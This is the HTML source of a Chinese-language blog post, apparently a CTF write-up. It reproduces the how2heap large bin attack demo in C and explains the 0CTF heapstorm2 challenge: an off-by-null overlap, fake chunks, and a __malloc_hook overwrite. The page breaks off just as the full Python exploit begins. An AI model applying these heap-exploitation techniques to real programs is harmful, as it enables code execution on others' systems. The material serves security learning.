@@ -1,0 +1,454 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://yoursite.com').hostname,
+    root: '/',
+    scheme: 'Muse',
+    version: '7.7.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="how2heap - large_bin_attack&amp;heapstorm2ubuntu16.04 libc2.23 large_bin_attack.c12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364">
+<meta property="og:type" content="article">
+<meta property="og:title" content="how2heap - large_bin_attack&amp;heapstorm2">
+<meta property="og:url" content="http://yoursite.com/2020/02/28/how2heap-large-bin-attack-heapstorm2/index.html">
+<meta property="og:site_name" content="Coldshiel&#39;s blog">
+<meta property="og:description" content="how2heap - large_bin_attack&amp;heapstorm2ubuntu16.04 libc2.23 large_bin_attack.c12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2020/02/28/how2heap-large-bin-attack-heapstorm2/1582794207618.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/28/how2heap-large-bin-attack-heapstorm2/1582823683795.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/28/how2heap-large-bin-attack-heapstorm2/1582796246258.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/28/how2heap-large-bin-attack-heapstorm2/1582822197248.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/28/how2heap-large-bin-attack-heapstorm2/1582822626533.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/28/how2heap-large-bin-attack-heapstorm2/1582822840553.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/28/how2heap-large-bin-attack-heapstorm2/1582822986854.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/28/how2heap-large-bin-attack-heapstorm2/1582823036813.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/28/how2heap-large-bin-attack-heapstorm2/1582945150529.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/28/how2heap-large-bin-attack-heapstorm2/1582946763810.png">
+<meta property="article:published_time" content="2020-02-29T07:30:16.000Z">
+<meta property="article:modified_time" content="2020-02-29T07:31:50.677Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/02/28/how2heap-large-bin-attack-heapstorm2/1582794207618.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/02/28/how2heap-large-bin-attack-heapstorm2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>how2heap - large_bin_attack&heapstorm2 | Coldshiel's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Coldshiel's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/28/how2heap-large-bin-attack-heapstorm2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Coldshiel's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          how2heap - large_bin_attack&heapstorm2
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-02-28 23:30:16 / Modified: 23:31:50" itemprop="dateCreated datePublished" datetime="2020-02-28T23:30:16-08:00">2020-02-28</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="how2heap-large-bin-attack-amp-heapstorm2"><a href="#how2heap-large-bin-attack-amp-heapstorm2" class="headerlink" title="how2heap - large_bin_attack&amp;heapstorm2"></a>how2heap - large_bin_attack&amp;heapstorm2</h1><p>ubuntu16.04 libc2.23</p>
+<h1 id="large-bin-attack-c"><a href="#large-bin-attack-c" class="headerlink" title="large_bin_attack.c"></a>large_bin_attack.c</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    This technique is taken from</span></span><br><span class="line"><span class="comment">    https://dangokyo.me/2018/04/07/a-revisit-to-large-bin-in-glibc/</span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment">              else</span></span><br><span class="line"><span class="comment">              &#123;</span></span><br><span class="line"><span class="comment">                  victim-&gt;fd_nextsize = fwd;</span></span><br><span class="line"><span class="comment">                  victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span></span><br><span class="line"><span class="comment">                  fwd-&gt;bk_nextsize = victim;</span></span><br><span class="line"><span class="comment">                  victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span></span><br><span class="line"><span class="comment">              &#125;</span></span><br><span class="line"><span class="comment">              bck = fwd-&gt;bk;</span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment">    mark_bin (av, victim_index);</span></span><br><span class="line"><span class="comment">    victim-&gt;bk = bck;</span></span><br><span class="line"><span class="comment">    victim-&gt;fd = fwd;</span></span><br><span class="line"><span class="comment">    fwd-&gt;bk = victim;</span></span><br><span class="line"><span class="comment">    bck-&gt;fd = victim;</span></span><br><span class="line"><span class="comment">    For more details on how large-bins are handled and sorted by ptmalloc,</span></span><br><span class="line"><span class="comment">    please check the Background section in the aforementioned link.</span></span><br><span class="line"><span class="comment">    [...]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This technique only works with disabled tcache-option for glibc, see glibc_build.sh for build instructions.\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates large bin attack by writing a large unsigned long value into stack\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"In practice, large bin attack is generally prepared for further attacks, such as rewriting the "</span></span><br><span class="line">           <span class="string">"global variable global_max_fast in libc for further fastbin attack\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's first look at the targets we want to rewrite on stack:\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_var1 (%p): %ld\n"</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_var2 (%p): %ld\n\n"</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x320</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we allocate the first large chunk on the heap at: %p\n"</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"</span></span><br><span class="line">           <span class="string">" the first large chunk during the free()\n\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Then, we allocate the second large chunk on the heap at: %p\n"</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"</span></span><br><span class="line">           <span class="string">" the second large chunk during the free()\n\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x400</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Finally, we allocate the third large chunk on the heap at: %p\n"</span>, p3 - <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"And allocate another fastbin chunk in order to avoid consolidating the top chunk with"</span></span><br><span class="line">           <span class="string">" the third large chunk during the free()\n\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"We free the first and second large chunks now and they will be inserted in the unsorted bin:"</span></span><br><span class="line">           <span class="string">" [ %p &lt;--&gt; %p ]\n\n"</span>, (<span class="keyword">void</span> *)(p2 - <span class="number">2</span>), (<span class="keyword">void</span> *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"</span></span><br><span class="line">            <span class="string">" freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation"</span></span><br><span class="line">            <span class="string">", and reinsert the remaining of the freed first large chunk into the unsorted bin:"</span></span><br><span class="line">            <span class="string">" [ %p ]\n\n"</span>, (<span class="keyword">void</span> *)((<span class="keyword">char</span> *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we free the third large chunk and it will be inserted in the unsorted bin:"</span></span><br><span class="line">           <span class="string">" [ %p &lt;--&gt; %p ]\n\n"</span>, (<span class="keyword">void</span> *)(p3 - <span class="number">2</span>), (<span class="keyword">void</span> *)(p3[<span class="number">0</span>]));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now emulating a vulnerability that can overwrite the freed second large chunk's \"size\""</span></span><br><span class="line">            <span class="string">" as well as its \"bk\" and \"bk_nextsize\" pointers\n"</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk"</span></span><br><span class="line">            <span class="string">" at the head of the large bin freelist. To overwrite the stack variables, we set \"bk\" to 16 bytes before stack_var1 and"</span></span><br><span class="line">            <span class="string">" \"bk_nextsize\" to 32 bytes before stack_var2\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."</span></span><br><span class="line">            <span class="string">" During this time, targets should have already been rewritten:\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_var1 (%p): %p\n"</span>, &amp;stack_var1, (<span class="keyword">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"stack_var2 (%p): %p\n"</span>, &amp;stack_var2, (<span class="keyword">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>感觉这种画个图的话就很明了，我这里画了一个<code>free(p3)</code>之后的图，unsortedbin上有两个chunk，largebin上有一个chunk</p>
+<p><img src="/2020/02/28/how2heap-large-bin-attack-heapstorm2/1582794207618.png" alt="1582794207618"></p>
+<p>这时largebin中的chunk fd_nextsize和bk_nextsize都指向自己，再来看看等下把chunk从unsortedbin中卸下来之后插入largebin的时候是什么样的</p>
+<p>largebin在原代码中的插入（largebin对应bin链有chunk的情况）是这样的：</p>
+<p><img src="/2020/02/28/how2heap-large-bin-attack-heapstorm2/1582823683795.png" alt="1582823683795"></p>
+<p>当我们改了原largebin链中的chunk之后，就变成了这样</p>
+<p><img src="/2020/02/28/how2heap-large-bin-attack-heapstorm2/1582796246258.png" alt="1582796246258"></p>
+<p>此时再插入0x410的chunk(对应victim)，就会执行最下面那个else分支中的代码，</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">victim-&gt;fd_nextsize = fwd;<span class="comment">//此时的fwd指向0x3f0的chunk</span></span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<span class="comment">//栈指针给到victim的bk_nextsize</span></span><br><span class="line">fwd-&gt;bk_nextsize = victim;</span><br><span class="line">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="comment">//此时var2对应的偏移刚好是-&gt;bk_nextsize-&gt;fd_nextsize</span></span><br><span class="line">									  <span class="comment">//所以var2会被赋值为victim</span></span><br><span class="line">&#125;</span><br><span class="line">bck = fwd-&gt;bk;<span class="comment">//此时bck被设置成了栈指针</span></span><br></pre></td></tr></table></figure>
+
+<p>接着看，因为后面还会执行一段代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mark_bin (av, victim_index);</span><br><span class="line">victim-&gt;bk = bck;</span><br><span class="line">victim-&gt;fd = fwd;</span><br><span class="line">fwd-&gt;bk = victim;</span><br><span class="line">bck-&gt;fd = victim;<span class="comment">//Here!栈指针指向位置的对应偏移处(var1)就也被赋值成了victim</span></span><br></pre></td></tr></table></figure>
+
+<p>原理就是这么个原理，任意地址写了两个vicitm的地址上去</p>
+<p>下面直接撸题实操吧</p>
+<h1 id="heapstorm2"><a href="#heapstorm2" class="headerlink" title="heapstorm2"></a>heapstorm2</h1><p>这个题说实话写的时候overlap都不知道该怎么用…所以后来就直接参考了<a href="https://dangokyo.me/2018/04/07/0ctf-2018-pwn-heapstorm2-write-up/" target="_blank" rel="noopener">wp</a>(跪…真的是前路漫漫啊)</p>
+<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>首先根据程序的mmap创建一个新的segment，这样在IDA中看起来会好一些</p>
+<h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p><img src="/2020/02/28/how2heap-large-bin-attack-heapstorm2/1582822197248.png" alt="1582822197248"></p>
+<p>程序用mallopt关掉了所有的fastbin，然后用mmap分配了一块固定地址的内存，并在random_area(0x13370800)为起始的位置存放了0x18个字节的随机数据，其中0偏移处的数据用来异或存放堆指针，+1偏移处的数据用来异或存放申请的size<br>然后+2和+3偏移处，也就是random_area[1]处的两个数据，是被设置成相等的</p>
+<p>设置mask的意思也就是说我们在程序中申请的chunk指针还有对应的size都会被异或两个固定值然后放在这块内存区域</p>
+<h3 id="alloc"><a href="#alloc" class="headerlink" title="alloc"></a>alloc</h3><p><img src="/2020/02/28/how2heap-large-bin-attack-heapstorm2/1582822626533.png" alt="1582822626533"></p>
+<p>最多只能有16个chunk，按照顺序排放，其中<code>mask_xor</code>函数就是用来xor对应数据的了，mask1用来xor指针，mask2用来异或size，因为random_area的前四个qword都有意义所以我们看到的数组下标都是+2的(这里可以设置一下结构体再优化一下)，calloc(size)之后没有赋值操作，所以只是分配</p>
+<h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p><img src="/2020/02/28/how2heap-large-bin-attack-heapstorm2/1582822840553.png" alt="1582822840553"></p>
+<p>update函数中会往chunk里读入数据（长度不能大于size-0xc），在最后再加上0xc长度的数据<code>HEAPSTORM_II</code>，但是补0的时候发生了溢出，构成off_by_null，这也是程序的漏洞点所在</p>
+<h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><p><img src="/2020/02/28/how2heap-large-bin-attack-heapstorm2/1582822986854.png" alt="1582822986854"></p>
+<p>delete函数就是输入下标然后free，并”清空”记录的数据</p>
+<h3 id="view"><a href="#view" class="headerlink" title="view"></a>view</h3><p><img src="/2020/02/28/how2heap-large-bin-attack-heapstorm2/1582823036813.png" alt="1582823036813"></p>
+<p>view函数比较苛刻，需要当我们random_area[1]处的两个值异或为0x13377331的时候才能writen，所以一开始leak不了，这也是我当时卡在这个题一直出不来的主要原因</p>
+<h2 id="漏洞分析-amp-exploit"><a href="#漏洞分析-amp-exploit" class="headerlink" title="漏洞分析&amp;exploit"></a>漏洞分析&amp;exploit</h2><p>程序只有一个off_by_null，所以就只能shrink freed chunk然后构造overlap了（提醒一下自己以后shrink时一定要记得如果chunk被放回了bin链然后再用fit匹配出来时会触发unlink，如果不设置好fake prev_size，由于前面那个size已经被改了所以unlink检查时就会崩掉，免得老在这坑住）</p>
+<p>然后后面的思路就是在random_area的上方利用largebin attack写上一个fakesize</p>
+<p>然后利用overlap将一个映射区域的固定地址写在unsortedbin中的chunk的bk上，为了把random_area的内存calloc出来。这个过程可能有点绕，画个图帮自己理解一下</p>
+<p>其中我们还需要把victim的地址写到我们构造fake chunk的bk处，首先是为了有个可写地址，但其实这个bk还有大用处</p>
+<p><img src="/2020/02/28/how2heap-large-bin-attack-heapstorm2/1582945150529.png" alt="1582945150529"></p>
+<p>当我们利用largebin attack写上值之后，我们在fakechunk上已经有了size和bk，此时的bk是victim</p>
+<p>但是由于PIE的映射是0x5?开头的地址，也就是说我们能接着calloc出来的chunk大小不能超过0x50可用的地方还得再缩小之后减0xC，当mask损坏的时候如果指针都不变，将会没有办法继续进行操作（而且这块区域是被初始化过的，好像不能直接给mask赋值，不过利用那个字符串去计算一个说不定可以），我当时想尽办法想通过这个0x50的chunk实现exploit但是始终不行，所以就又去参考了师傅们的WP，发现师傅们是通过再构造一个再calloc出来的(跪)，瞬间就好像又有思路了</p>
+<p>我们写的bk是vicitm，所以calloc这个0x5?的chunk之后victim又被放到unsortedbin上面去了，但是如果这个victim chunk内容是我们通过overlap控制的话，就可以再接着calloc一个fake chunk，而且此时fakechunk的构造更简单了因为我们已经有了一个0x5?的chunk，可以直接写一个大一点的fakesize</p>
+<p>在接着试图calloc random_area时，我们calloc出vicitm之后，还需要把fake chunk的bk再设置一下，因为unsortedbin卸下时需要可写地址，update那个0x5?的chunk就行（写的这个地址因为是libc的，所以在我这个利用中也发挥了很大的用处）</p>
+<p>calloc出来这块mem之后，这里的值就全都被置零了，相当于列表清空..效果大概是这样的：</p>
+<p><img src="/2020/02/28/how2heap-large-bin-attack-heapstorm2/1582946763810.png" alt="1582946763810"></p>
+<p>我这里没有清完，其实还可以清的更空一些，不过也够了。我的size设置的位置偏了8 23333因为当时怕影响到后面的数据</p>
+<p>可以看到我们calloc出这块mem的时候，因为是先calloc再通过异或存到记录上，所以calloc之后的mask全都成0了，存上去的也就是真实值</p>
+<p>然后通过这个记录填上固定异或值，并填上我们写的libc地址的位置，还有size，直接读出来之后有任意地址写了就完事了！</p>
+<p>我选择的是写<code>__malloc_hook</code>到<code>one_gadget</code>，我看师傅们用的是<code>__free_hook</code>到system然后free一个有<code>/bin/sh</code>字符串的chunk，好像师傅们的更稳定一些，不过到后面任意地址读写之后就简单很多了也不多废话了</p>
+<p>这里还记一个看师傅们博客看到的操作，就是largebin attack中如果我们能控制最开始的那个corrupt chunk就能多次利用进行largebin attack</p>
+<h2 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span 